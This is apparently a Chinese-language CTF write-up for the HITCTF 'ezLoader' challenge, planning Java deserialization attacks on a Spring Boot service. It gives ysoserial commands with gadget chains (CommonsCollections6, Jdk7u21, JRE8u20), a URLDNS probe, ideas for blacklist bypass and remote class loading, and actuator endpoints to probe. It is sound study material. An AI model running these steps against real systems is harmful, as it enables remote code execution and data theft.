# HITCTF ezLoader - 问题分析与解决方案

## 🔍 问题分析

### 1. Java 17+ 模块化问题
**问题**: ysoserial 在 Java 17+ 上报错 `InaccessibleObjectException`

**解决**: ✅ 已修复 - 添加 `--add-opens` 参数

```bash
java --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections6 "whoami"
```

### 2. 缺少 commons-collections 依赖
**问题**: 目标服务器 `BOOT-INF/lib` 目录下**没有** commons-collections 库

**已确认的依赖**:
```
- commons-logging-1.3.4.jar
- jackson-annotations-2.13.0.jar
- jakarta.annotation-api-1.3.5.jar
- spring-jcl-5.3.39.jar
- spring-boot-jarmode-layertools-2.6.0.jar
- slf4j-api-1.7.32.jar
```

**结论**: ❌ CommonsCollections 链无法使用

### 3. 服务器返回 500 错误
所有 CC 链都返回 500，可能原因:
- payload 触发异常
- 依赖库不存在导致类加载失败

## ✅ 可行的利用方案

### 方案 1: URLDNS 测试反序列化
```python
# 先确认反序列化是否可用
python test_urldns.py

# 修改 dnslog 域名后执行
# 如果收到 DNS 请求，说明反序列化成功
```

### 方案 2: 原生 JDK 利用链
```bash
# Jdk7u21 (需要 JDK <= 7u21)
java ... -jar ysoserial.jar Jdk7u21 "whoami"

# JRE8u20 (需要 JRE <= 8u20)  
java ... -jar ysoserial.jar JRE8u20 "whoami"
```

### 方案 3: 检查完整的 jar 包
当前看到的可能是反编译后的结构，**原始 jar 包可能有更多依赖**。

建议:
```bash
# 1. 找到原始 app.jar
# 2. 查看完整依赖
jar -tf app.jar | grep "\.jar$"

# 或解压查看
unzip -l app.jar | grep BOOT-INF/lib
```

### 方案 4: 题目名 "ezLoader" 暗示
可能需要**自己加载恶意类**:
- 利用类加载机制
- 上传/注入恶意 JAR
- URLClassLoader 远程加载

## 🚀 推荐执行顺序

### Step 1: 确认反序列化可用
```bash
# 修改 test_urldns.py 中的 dnslog 域名
python test_urldns.py
```

### Step 2: 尝试原生链
```bash
python exp_native.py
# 选择 Jdk7u21 或 JRE8u20
```

### Step 3: 检查原始 jar
```bash
# 如果有原始 app.jar
jar -tf app.jar | grep commons-collections
```

### Step 4: 自定义 Payload
如果以上都失败，可能需要:
- 分析 SecureObjectInputStream 的具体实现
- 构造绕过黑名单的自定义链
- 利用 Spring 框架本身的 gadget

## 📝 当前可用脚本

| 文件 | 用途 | 状态 |
|------|------|------|
| `exp.py` | CC 链利用 (完整版) | ✅ Java17+ 已修复 |
| `exp_native.py` | 原生 JDK 链利用 | ✅ 可用 |
| `test_urldns.py` | URLDNS 快速测试 | ✅ 可用 |
| `exploit.sh` | Linux 一键脚本 | ✅ 已更新 |
| `exploit.bat` | Windows 一键脚本 | ✅ 已更新 |

## 🔧 下一步调试

1. **获取详细错误信息**
   - 尝试访问 `/error` 端点
   - 查看是否有错误堆栈输出

2. **确认 JDK 版本**
   ```bash
   # 如果能执行命令，先确认版本
   java -version
   ```

3. **寻找其他端点**
   ```bash
   # 可能有其他可利用的接口
   /actuator/env
   /actuator/heapdump
   ```

4. **分析题目环境**
   - 题目是否提供了 Dockerfile?
   - 是否有其他提示文件?

## 📚 参考资料

- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [Java 反序列化漏洞原理](https://xz.aliyun.com/t/7031)
- [JDK 原生链分析](https://xz.aliyun.com/t/10307)
